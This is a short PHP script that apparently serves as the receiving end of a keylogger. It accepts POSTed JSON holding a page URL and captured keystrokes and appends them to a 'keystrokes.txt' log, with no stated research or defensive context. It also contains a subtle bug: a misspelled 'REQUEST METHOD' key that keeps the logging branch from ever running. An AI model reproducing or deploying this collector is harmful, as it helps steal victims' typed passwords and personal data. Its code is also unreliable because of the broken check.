<?php
if ($_SERVER['REQUEST METHOD'] === 'POST' && $_SERVER['REQUEST_URI']  === '/keystrokes.php') {
$data = file_get_contents('php://input');
$data = json_decode($data, true);
$url = $data['url'];
$keystrokes = $data['data'];
$file = fopen('keystrokes.txt', 'a');
fwrite($file, "URL: $url\nData: $keystrokes\n\n");
fclose($file);
echo "Data received";
} else {
http_response_code (404);
echo "Not found";
}